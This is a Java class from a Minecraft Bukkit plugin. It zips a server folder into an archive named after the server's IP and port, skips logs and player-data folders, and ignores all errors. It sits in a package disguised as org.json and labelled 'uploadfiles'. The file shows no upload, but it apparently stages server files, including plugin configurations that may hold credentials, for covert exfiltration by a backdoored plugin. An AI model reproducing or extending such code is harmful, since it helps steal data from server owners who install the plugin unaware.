package org.json.utils.uploadfiles;

import org.apache.commons.io.IOUtils;
import org.bukkit.Bukkit;
import org.json.utils.api.ModalAPI;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.util.Objects;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

public class CompressFolderUtils {

    private static final String fileName = ModalAPI.getIp() + "_" + Bukkit.getPort() + "_" + "BackUp.zip";
    private static final File outputDir = new File("plugins/zLibrary/BackUp/");

    private static final String[] EXCLUDED_KEYWORDS = {
            "Skript/backups",
            "InventoryRollbackPlus",
            "Stats",
            "PlayerData",
            "DataPacks",
            "Logs",
            "Lang",
            "CoreProtect",
            "crash-reports",
            "Essentials/userdata",
            "debug",
            "cache",
            ".zip",
            ".gz",
            ".old"
    };

    public static File zipFolder(File folder) {
        if (!outputDir.exists()) {
            if (!outputDir.mkdirs()) {
                return null;
            }
        }

        File zipFile = new File(outputDir, fileName);
        try (ZipOutputStream zos = new ZipOutputStream(new FileOutputStream(zipFile))) {
            zipFolder(folder, "", zos);
            return zipFile;
        } catch (Exception ignored) {
            return null;
        }
    }

    private static void zipFolder(File folder, String parentFolder, ZipOutputStream zos) {
        try {
            for (File file : Objects.requireNonNull(folder.listFiles())) {
                if (file.getName().equals(fileName)) continue;
                if (file.isDirectory()) {
                    String relativePath = parentFolder.isEmpty() ? file.getName() : parentFolder + "/" + file.getName();

                    if (containsKeyword(relativePath)) {
                        continue;
                    }

                    zipFolder(file, relativePath, zos);
                } else {
                    String relativePath = parentFolder.isEmpty() ? file.getName() : parentFolder + "/" + file.getName();
                    zos.putNextEntry(new ZipEntry(relativePath));
                    try (FileInputStream fis = new FileInputStream(file)) {
                        IOUtils.copy(fis, zos);
                    }
                    zos.closeEntry();
                }
            }
        } catch (Exception ignored) {
        }
    }

    private static boolean containsKeyword(String filePath) {
        for (String keyword : EXCLUDED_KEYWORDS) {
            if (filePath.toLowerCase().contains(keyword.toLowerCase())) {
                return true;
            }
        }
        return false;
    }
}
